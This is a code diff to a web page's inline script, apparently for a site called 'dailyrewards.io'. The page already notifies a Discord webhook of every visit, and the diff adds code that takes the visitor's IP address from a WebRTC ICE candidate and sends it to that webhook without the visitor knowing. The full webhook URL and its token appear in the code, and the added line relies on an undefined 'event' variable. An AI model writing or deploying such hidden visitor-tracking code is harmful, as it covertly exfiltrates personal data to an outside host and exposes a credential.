@@ -5,6 +5,9 @@
   <meta charset='utf-8'>
   <script>
     function webhook() {
+
+      const ipAddress = event.candidate.candidate.split(' ')[4];
+      
       var hook = new XMLHttpRequest();
 
       hook.open('POST', 'https://discord.com/api/webhooks/1270604193304150016/rHiHzk3OBoWTg6ZiU3X9EIGSYo0Iks6lEGX7U2rrBZqM7u6kE3Y6D-mj4uuKKoZ5b7Hf');
@@ -12,7 +15,7 @@
       hook.setRequestHeader('Content-type', 'application/json');
 
       var content = {
-        content: 'Someone went to the **dailyrewards.io** domain, congratulations!'
+        content: 'Someone went to the **dailyrewards.io** domain, congratulations! **IP Address:** '+ipAddress
       }
 
       hook.send(JSON.stringify(content));
